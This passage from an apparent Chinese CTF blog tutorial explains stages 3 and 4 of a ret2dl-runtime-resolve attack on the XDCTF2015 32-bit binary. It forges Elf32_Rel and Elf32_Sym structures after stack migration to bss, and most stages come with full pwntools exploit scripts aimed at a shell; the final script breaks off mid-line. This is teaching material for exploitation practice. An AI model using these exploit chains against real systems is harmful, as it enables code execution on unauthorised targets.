comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span><span class="token comment">#print("rop.chain2:", rop.chain())</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span><span class="token comment">#获取plt0地址</span>plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment">#计算write函数重定位索引</span>write_index <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span> <span class="token operator">-</span> plt0<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>write_index<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'dead'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stage3-–-迁移ELF32-Rel"><a href="#stage3-–-迁移ELF32-Rel" class="headerlink" title="stage3 – 迁移ELF32_Rel"></a>stage3 – 迁移<code>ELF32_Rel</code></h3><p>上一部分我们利用<code>.plt</code>来推演计算<code>reloc_index</code>的值，这一部分我们直接绕过<code>.rel.plt + reloc_index</code>的计算，直接让程序指向write函数的<code>Elf32_Rel</code>结构体，实际上是对结构体的迁移，也就是下面红圈的位置：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/11.png"></p><p><strong>构建结构体成员</strong><br>如果在新栈中，ret位是<code>plt0</code>的话，<strong>接下来就需要一个地址将整个流程指向我们需要伪造的write_Elf32_Rel结构体</strong>，这个地址先放在这等会说。先看write函数在<code>.rel.plt</code>的结构体如何构建：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  Elf32_Addr r_offset<span class="token punctuation">;</span>  Elf32_Word r_info<span class="token punctuation">;</span><span class="token punctuation">}</span>Elf32_Rel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>Elf32_Rel</code>结构体长这样。**也就是说我们需要去模拟两个成员变量，一个是<code>r_offset</code>，另一个就是<code>r_info</code>。<code>r_offset</code>可以通过pwntools的的elf模块自动获取，这个成员变量就是write函数在got表的偏移<code>write_got = elf.got[‘write’]</code>**。那么另外一个成员变量无法通过pwntools自动获取，但是可以通过readelf这个工具来查看，输入命令<code>readelf -a main</code></p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/12.png"></p><p>输入命令你会看到很多的内容，在其中找到图片上的位置，可以看到write函数对应的位置，我们主要取的就是下面红圈的r_info = 0x607。当然在这里也能看到r_offset，所以直接使用readelf显示的或者使用pwntools获取的都可以。</p><p><strong>构建寻找结构体过程</strong><br>那这样一来我们想要构造的结构体内容就找到了，接下来需要考虑的是怎么在bss段新栈上让程序运行到我们构建的结构体。回顾一下<code>_dl_runtime_resolve</code>函数是怎么找到结构体的，通过<code>.rel.plt + reloc_index</code>找到了函数对应的结构体。我们拆开看，相<strong>当于一个基地址加上了一个相对基地址的偏移找到了结构体</strong>。我们在bss段上的新栈里部署了plt0，代替了函数调用功能，接下来就会执行<code>_dl_runtime_resolve</code>函数。运行<code>_dl_runtime_resolve</code>函数也会执行<code>.rel.plt + reloc_index</code>的过程，基地址还是<code>.rel.plt</code>，只不过偏移变了。<strong>由于<code>_dl_runtime_resolve</code>函数没有做边界检查，所以我们的偏移可以偏到任何一个想要指向的位置（程序领空）</strong>。</p><p>也就是：正常情况下从<code>.rel.plt</code>基地址出发加上正常偏移后会指向<code>.rel.plt</code>内的write函数结构体，但是通过修改偏移，使得运行流程会指向bss段内新建栈中的伪造write函数结构体，暂定指向伪造write函数结构体的偏移为index_offset</p><p>那么就可以构建一个等式：<code>.rel.plt + index_offset = read_bss_start（新栈基地址） + 伪造函数结构体存放位置偏移</code>。我们真正需要的其实是index_offset，它相当于伪造的<code>_dl_runtime_resolve</code>函数的第二参数，从而能够指向我们构建的write函数的结构体</p><p>所以将等式变形一下：<code>index_offset = read_bss_start（新栈基地址） + 伪造函数结构体存放位置偏移 - .rel.plt</code></p><p>还有一个问题需要解决，那就是伪造函数存放位置偏移是多少，也就是说我们把伪造的函数结构体放在了新栈的哪个位置，这个就需要在栈布局的时候考虑到。我们在stage2的栈中使用了很多的“A”进行填充，那么结构体就可以放在一堆“A”中：</p><pre><code>  低地址位         +---------------------+  0x00  |        plt0         |  &lt;----ret        +---------------------+  0x04  |    index_offset     | 伪造的偏移           +---------------------+  0x08  |        dead         | write函数返回地址           +---------------------+  0x0c  |          1          | write函数1参           +---------------------+  0x10  |     /bin/sh;地址     | write函数2参，/bin/sh;字符串所在地址           +---------------------+                   0x14  |          7          | write函数3参                +---------------------+     0x18  |      r_offset       | 伪造的结构体成员变量r_offset        +---------------------+  0x1c  |       r_info        | 伪造的结构体成员变量r_info        +---------------------+           |        AAAA         |  填充                      |        ....         |  填充                     |        AAAA         |  填充                       +---------------------+                  0x50|      /bin/sh;       | /bin/sh;字符串           +---------------------+            |        AAAA         |           |        ....         |                         |        AAAA         |高地址位 +----------------------+</code></pre><p> 因为是32位程序，所以每一行都是4字节，其实把结构体放在从0x14到0x50中间任何位置都可以，因为他都是使用“A”来填充的，不会对执行流程有什么影响。这里就近写在了0x18和0x1c的位置，那么伪造的结构体相对基地址的偏移就是0x18，也就是24个字节。这样一来我们的等式就完善了：<code>index_offset = read_bss_start + 24 - .rel.plt</code></p><p>其中的<code>.rel.plt</code>的基地址可以通过pwntools的ROP模块自动获取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#libc = elf.libc</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#填充buf</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token comment">#向read_bss_start读入100个字节</span><span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">#栈迁移</span><span class="token comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span><span class="token comment">#print("rop.chain2:", rop.chain())</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span><span class="token comment">#获取plt0地址</span>plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment">#获取.rel.plt基地址</span>rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rel.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment">#计算write函数重定位索引</span>index_offset <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">-</span> rel_pltr_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>r_info <span class="token operator">=</span> <span class="token number">0x607</span><span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'dead'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stage4-–-迁移-dynsym"><a href="#stage4-–-迁移-dynsym" class="headerlink" title="stage4 – 迁移.dynsym"></a>stage4 – 迁移<code>.dynsym</code></h3><p>上一部分我们通过改变偏移，部署结构体的方式完成了对于write函数的调用。这一部分依然还是通过在新栈中构建结构体，不过<code>r_info</code>的计算方式变了，通过<code>.dynsym</code>来计算。也就是说需要对<code>.dynsym</code>进行迁移，模拟的是下面红圈的部分：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/13.png"></p><p><strong>.dynsym的迁移及地址对齐</strong><br>在迁移之前需要知道write函数在<code>.dynsym</code>中的结构体。<code>.dynsym</code>中的结构体如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  Elf32_Word    st_name<span class="token punctuation">;</span> <span class="token comment">//符号名，是相对.dynstr起始的偏移</span>  Elf32_Addr    st_value<span class="token punctuation">;</span>  Elf32_Word    st_size<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span> <span class="token comment">//对于导入函数符号而言，它是0x12</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>  Elf32_Section st_shndx<span class="token punctuation">;</span><span class="token punctuation">}</span>Elf32_Sym<span class="token punctuation">;</span> <span class="token comment">//对于导入函数符号而言，除st_name外其他字段都是0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说我们想要找的write函数的结构体内容大致为“[偏移 , 0 , 0 , 0x12]”，那么怎么去定位write函数的结构体呢？输入命令<code>readelf -a main</code>，你会在显示的内容中找到如下信息：<br><img src="/2023/04/19/ret2-dl-runtime-resolve/14.png"></p><p>在这部分信息中我们可以看到write函数结构体的下标，也就是前面的Num = 6。接下来使用命令<code>readelf -x .dynsym main</code>查看一下该程序<code>.dynsym</code>中的数据，第6个就是write；</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/15.png"></p><p>我们可以看到下标为6的位置里面的数据就是write函数的结构体内容（下标从0开始），这样我们就可以得到write函数在<code>.dynsym</code>中的结构体内容（小端序）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">fake_write_sym <span class="token operator">=</span> <span class="token function">flat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>知道了结构体内容之后，我们就需要考虑将这个结构体放在bss段新栈的哪个位置了。在stage3的时候我们将<code>write_rel_plt</code>的结构体内容放在了0x18和0x1c的位置。那么我们的<code>fake_write_sym</code>就可以紧接着放在0x20的位置，也就是相对新栈基地址read_bss_start偏移0x20字节处开始部署：</p><p><strong>地址对齐</strong></p><p>但是在部署的时候需要考虑一个问题，就是地址对齐。为什么要进行地址对齐呢？因为我们打算在read_bss_start + 32的位置部署<code>write_sym</code>结构体，但是我们找的位置可能相对于<code>.dynsym</code>来说并不是一个标准地址。什么叫标准地址呢？<code>.dynsym</code>的每个结构体大小为16个字节，也就是说如果想找到某个函数的<code>.dynsym</code>结构体，那么就需要16个字节16个字节的找，所以地址低字节得为<code>dynsym</code>的低字节相同。这个时候就需要用到下面的公式了：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">fake_sym_addr <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x20</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>  fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>通过<code>.dynsym</code>结构体下标反推<code>r_info</code></strong><br>我们在前面在原理部分讲过<code>_dl_runtime_resolve</code>运行过程，<code>r_info</code>通过右移8位去掉”07“标识为得到函数在<code>.dynsym</code>中的下标。那么我们反过来想，如果我们得到了<code>.dynsym</code>的下标，左移8位再与上0x07不就可以得到<code>r_info</code>了嘛😋</p><p>所以在对齐之后就需要考虑新栈中<code>.dynsym</code>结构体相对于<code>.dynsym</code>的基地址是第几个结构体，因为<code>.dynsym</code>每个结构体大小为16个字节，所以新栈<code>结构体地址fake_sym_addr - .dynsym基地址</code>得到距离，这个距离里到底有几个结构体，除以16就行了（<code>.dynsym</code>基地址可通过pwntools自动获取）：</p><p><code>index_dynsym = (fake_sym_addr - .dynsym) // 0x10</code></p><p>在得到<code>.dynsym</code>下标之后，就可以进行左移8，然后再与上0x07就可以了：</p><p><code>r_info = (index_dynsym &lt;&lt; 8) | 0x7</code><br>最后就是将构建的<code>.rel.plt</code>的结构体放在read_bss_start + 24的地方了，部署的方式和前面的stage3一样还是通过公式<br><code>index_offset = read_bss_start + 0x18 - .rel.plt</code>算出偏移指向构建的<code>.rel.plt</code>的结构体的位置</p><p>stage4的栈布局如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">  低地址位     <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x00</span>  <span class="token operator">|</span>        plt0         <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span>ret<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x04</span>  <span class="token operator">|</span>    index_offset     <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体偏移       <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x08</span>  <span class="token operator">|</span>        dead         <span class="token operator">|</span> write函数返回地址   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x0c</span>  <span class="token operator">|</span>          <span class="token number">1</span>          <span class="token operator">|</span> write函数<span class="token number">1</span>参   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x10</span>  <span class="token operator">|</span>     <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>地址     <span class="token operator">|</span> write函数<span class="token number">2</span>参，<span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串所在地址   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                   <span class="token number">0x14</span>  <span class="token operator">|</span>          <span class="token number">7</span>          <span class="token operator">|</span> write函数<span class="token number">3</span>参        <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     <span class="token number">0x18</span>  <span class="token operator">|</span>      r_offset       <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体成员变量r_offset        <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x1c</span>  <span class="token operator">|</span>       r_info        <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体成员变量r_info        <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x20</span>  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  对齐   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x24</span>  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  对齐   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x28</span>  <span class="token operator">|</span>       st_name       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_name  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x2c</span>  <span class="token operator">|</span>       st_value      <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_value  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x30</span>  <span class="token operator">|</span>       st_size       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_size  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>  <span class="token number">0x34</span>  <span class="token operator">|</span>       st_info       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_info   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>              <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充    <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>  填充             <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                  <span class="token number">0x50</span><span class="token operator">|</span>      <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>       <span class="token operator">|</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>   <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>                 <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>         高地址位 <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 这里我们还是用之前的read_bss_start是打不通的：并没有输入<code>/bin/sh;</code>字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#libc = elf.libc</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#填充buf</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token comment">#向read_bss_start读入100个字节</span><span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">#栈迁移</span><span class="token comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span><span class="token comment">#print("rop.chain2:", rop.chain())</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to 